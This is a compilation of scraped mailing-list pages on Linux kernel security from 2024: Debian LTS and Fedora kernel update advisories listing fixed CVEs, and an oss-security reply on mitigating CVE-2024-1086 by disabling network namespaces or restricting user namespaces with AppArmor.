=== Content from lists.debian.org_8e2a4762_20250111_070332.html ===


---

[[Date Prev](msg00015.html)][[Date Next](msg00017.html)]
[[Thread Prev](msg00015.html)][[Thread Next](msg00017.html)]
[[Date Index](maillist.html#00016)]
[[Thread Index](threads.html#00016)]

# [SECURITY] [DLA 3841-1] linux-5.10 security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3841-1] linux-5.10 security update
* *From*: Ben Hutchings <benh@debian.org>
* *Date*: Tue, 25 Jun 2024 21:41:14 +0200
* *Message-id*: <[[🔎]](/msgid-search/ZnsdWnKC38pb009r%40decadent.org.uk) [ZnsdWnKC38pb009r@decadent.org.uk](msg00016.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-3841-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                        Ben Hutchings
June 25, 2024                                 <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : linux-5.10
Version        : 5.10.209-2~deb10u1
CVE ID         : CVE-2023-6040 CVE-2023-6356 CVE-2023-6535 CVE-2023-6536
                 CVE-2023-6606 CVE-2023-6915 CVE-2023-39198 CVE-2023-46838
                 CVE-2023-51779 CVE-2023-52340 CVE-2023-52436 CVE-2023-52438
                 CVE-2023-52439 CVE-2023-52443 CVE-2023-52444 CVE-2023-52445
                 CVE-2023-52448 CVE-2023-52449 CVE-2023-52451 CVE-2023-52454
                 CVE-2023-52456 CVE-2023-52457 CVE-2023-52462 CVE-2023-52463
                 CVE-2023-52464 CVE-2023-52467 CVE-2023-52469 CVE-2023-52470
                 CVE-2023-52609 CVE-2023-52612 CVE-2023-52675 CVE-2023-52679
                 CVE-2023-52683 CVE-2023-52686 CVE-2023-52690 CVE-2023-52691
                 CVE-2023-52693 CVE-2023-52694 CVE-2023-52696 CVE-2023-52698
                 CVE-2024-0646 CVE-2024-1086 CVE-2024-24860 CVE-2024-26586
                 CVE-2024-26597 CVE-2024-26598 CVE-2024-26633

Several vulnerabilities were discovered in the Linux kernel that may
lead to a privilege escalation, denial of service or information
leaks.

For Debian 10 buster, these problems were fixed earlier in version
5.10.209-2~deb10u1.  This update additionally included many more bug
fixes from stable updates 5.10.206-5.10.209 inclusive.

For the detailed security status of linux-5.10 please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/linux-5.10>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpU6AD6rO3sK.pgp)**

*Description:* PGP signature

---



=== Content from www.openwall.com_5f6c5666_20250111_070331.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[<thread-prev]](../../../2024/04/16/1) [[thread-next>]](../../../2024/04/19/4) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <354b913bc1c154c1e3a2fc34ed8ed6b0d4641f11.camel@canonical.com>
Date: Wed, 17 Apr 2024 09:52:10 -0300
From: Georgia Garcia <georgia.garcia@...onical.com>
To: oss-security@...ts.openwall.com
Subject: Re: Linux: Disabling network namespaces

On Sun, 2024-04-14 at 21:08 +0200, Solar Designer wrote:
> Hi,
>
> Many Linux kernel vulnerabilities including the recently exploited
> Netfilter CVE-2024-1086 require CAP_NET_ADMIN in a namespace, yet a
> typically recommended mitigation is to disable user namespaces (not just
> network namespaces).
>
> Further, while on Debian/Ubuntu it is possible to disable just
> unprivileged user namespaces with the Debian-specific sysctl
> kernel.unprivileged_userns_clone=0, on other distros we'd have to use
> user.max_user_namespaces=0, which (unnecessarily) prevents starting of
> containers even by root.

I just wanted to add that in the Ubuntu Noble Numbat release we are
using AppArmor to restrict unprivileged user namespaces.

Applications that don't have an AppArmor profile will use a default
profile which denies the use of capabilities within the user namespace.
Applications that need to use capabilities will have to be confined by
a profile. Since we understand that creating an AppArmor profile might
not be a trivial task for large programs, we introduced the
"unconfined" flag which makes the profile act as if it were unconfined
from the perspective of AppArmor, allowing all operations.

There are more details here:
<https://discourse.ubuntu.com/t/noble-numbat-release-notes/39890#unprivileged-user-namespace-restrictions-13>

>
> Fredrik Nystrom on Rocky Linux Mattermost channel Security pointed out
> that it is reasonable to disable just network namespaces with
> user.max_net_namespaces=0 instead, and that the negative effects of
> doing so and how to cope with them are well-documented for Apptainer,
> with its documentation also covering Docker, Podman, and systemd:
>
> <https://apptainer.org/docs/admin/latest/user_namespace.html#disabling-network-namespaces>
>
> I hope some of us in here find this useful, and maybe we (including
> distros) will start recommending this milder mitigation when sufficient.
>
> I include this section of the Apptainer documentation below, as taken
> from its source at
> <https://github.com/apptainer/apptainer-admindocs/blob/main/user_namespace.rst>
>
> ---
> ******************************
>  Disabling network namespaces
> ******************************
>
> There have been many Linux kernel exploits that have made use of
> unprivileged user namespaces as a point of entry, but almost all of them
> in the last few years have been in combination with network namespaces.
> Therefore even though the Apptainer project recommends enabling
> unprivileged user namespaces, it recommends disabling network namespaces
> when possible in order to substantially reduce the risk profile
> and need for urgent updates when vulnerabilities are announced.
>
> Network namespaces can be disabled on most Linux-based systems
> like this:
>
> .. code:: bash
>
>    echo "user.max_net_namespaces = 0" \
>         >/etc/sysctl.d/90-max_net_namespaces.conf
>    sysctl -p /etc/sysctl.d/90-max_net_namespaces.conf
>
> Apptainer does not by default make use of network namespaces, but it
> does have some little-used privileged options beginning with ``--net``
> that do.
> Those options will not work when network namespaces are disabled.
> Unfortunately it is not possible to disable only unprivileged
> network namespaces, so this will affect programs that use them
> even if run as root.
>
> Some other container runtimes such as Docker and Podman do make use
> of network namespaces by default.
> Those two runtimes can still work when network namespaces are disabled
> by adding the ``--net=host`` option.
>
> Disabling network namespaces also blocks the systemd PrivateNetwork
> feature.
> To find services that use it, look for ``PrivateNetwork=true``
> or ``PrivateNetwork=yes`` in ``/lib/systemd/system/*.service``.
> This can be turned off for each service through a
> ``/etc/systemd/system/<service>.d/*.conf`` file, for example for
> ``systemd-hostnamed``:
>
> .. code:: bash
>
>    cd /etc/systemd/system
>    mkdir -p systemd-hostnamed.service.d
>    (echo "[Service]"; echo "PrivateNetwork=no") \
>         >systemd-hostnamed.service.d/no-private-network.conf
>
> If the service is enabled (that is, actively used) then restart it
> and check its status:
>
> .. code:: bash
>
>    systemctl status systemd-hostnamed
>    systemctl daemon-reload
>    systemctl restart systemd-hostnamed
>    systemctl status systemd-hostnamed
> ---
>
> Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from lists.fedoraproject.org_dbf2590b_20250111_070333.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/7LSPIOMIJYTLZB6QKPQVVAYSUETUWKPF/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/7LSPIOMIJYTLZB6QKPQVVAYSUETUWKPF/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/7LSPIOMIJYTLZB6QKPQVVAYSUETUWKPF/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/7LSPIOMIJYTLZB6QKPQVVAYSUETUWKPF/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-7LSPIOMIJYTLZB6QKPQVVAYSUETUWKPF.mbox.gz?message=7LSPIOMIJYTLZB6QKPQVVAYSUETUWKPF "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/7LSPIOMIJYTLZB6QKPQVVAYSUETUWKPF/#7LSPIOMIJYTLZB6QKPQVVAYSUETUWKPF)

# [SECURITY] Fedora 39 Update: kernel-6.7.3-200.fc39

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

5 Feb
2024

5 Feb
'24

7:18 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2024-2116a8468b
2024-02-06 01:17:01.499269
--------------------------------------------------------------------------------

Name : kernel
Product : Fedora 39
Version : 6.7.3
Release : 200.fc39
URL : <https://www.kernel.org/>
Summary : The Linux kernel
Description :
The kernel meta package

--------------------------------------------------------------------------------
Update Information:

The 6.7.3 stable kernel rebase contains new features, improved hardware support,
and a number of important fixes across the tree.
--------------------------------------------------------------------------------
ChangeLog:

\* Wed Jan 31 2024 Justin M. Forbes jforbes@fedoraproject.org [6.7.3-0]
- Config update for stable backport (Justin M. Forbes)
- Add some more bugs to BugsFixed (Justin M. Forbes)
- Linux v6.7.3
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2253986 - CVE-2023-6679 kernel: NULL pointer dereference in dpll\_pin\_parent\_pin\_set() in drivers/dpll/dpll\_netlink.c
<https://bugzilla.redhat.com/show_bug.cgi?id=2253986>
[ 2 ] Bug #2260041 - CVE-2024-23849 kernel: off-by-one error for an RDS\_MSG\_RX\_DGRAM\_TRACE\_MAX comparison, resulting in out-of-bounds access
<https://bugzilla.redhat.com/show_bug.cgi?id=2260041>
[ 3 ] Bug #2262126 - CVE-2024-1086 kernel: nf\_tables: use-after-free vulnerability in the nft\_verdict\_init() function
<https://bugzilla.redhat.com/show_bug.cgi?id=2262126>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2024-2116a8468b' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/7LSPIOMIJYTLZB6QKPQVVAYSUETUWKPF/#7LSPIOMIJYTLZB6QKPQVVAYSUETUWKPF)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from lists.debian.org_e047c9ff_20250111_070332.html ===


---

[[Date Prev](msg00019.html)][[Date Next](msg00021.html)]
[[Thread Prev](msg00019.html)][[Thread Next](msg00021.html)]
[[Date Index](maillist.html#00020)]
[[Thread Index](threads.html#00020)]

# [SECURITY] [DLA 3840-1] linux security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3840-1] linux security update
* *From*: Ben Hutchings <benh@debian.org>
* *Date*: Thu, 27 Jun 2024 13:30:44 +0200
* *Message-id*: <[[🔎]](/msgid-search/Zn1NZBWeoEHK3cXd%40decadent.org.uk) [Zn1NZBWeoEHK3cXd@decadent.org.uk](msg00020.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-------------------------------------------------------------------------
Debian LTS Advisory DLA-3840-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                        Ben Hutchings
June 25, 2024                                 <https://wiki.debian.org/LTS>
-------------------------------------------------------------------------

Package        : linux
Version        : 4.19.316-1
CVE ID         : CVE-2021-33630 CVE-2022-48627 CVE-2023-0386 CVE-2023-6040
                 CVE-2023-6270 CVE-2023-7042 CVE-2023-46838 CVE-2023-47233
